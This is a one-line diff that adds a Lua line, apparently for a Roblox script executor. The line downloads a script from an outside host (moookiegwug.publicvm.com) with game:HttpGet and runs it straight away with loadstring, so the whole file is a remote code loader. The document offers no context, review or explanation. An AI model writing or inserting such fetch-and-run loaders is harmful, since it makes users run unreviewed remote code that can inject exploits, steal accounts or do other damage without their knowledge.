@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://moookiegwug.publicvm.com/Hiru/uploads/Bucutaodimaynhoc/fa3abc19a92f5622_Bucutaodimaynhoc.lua"))()
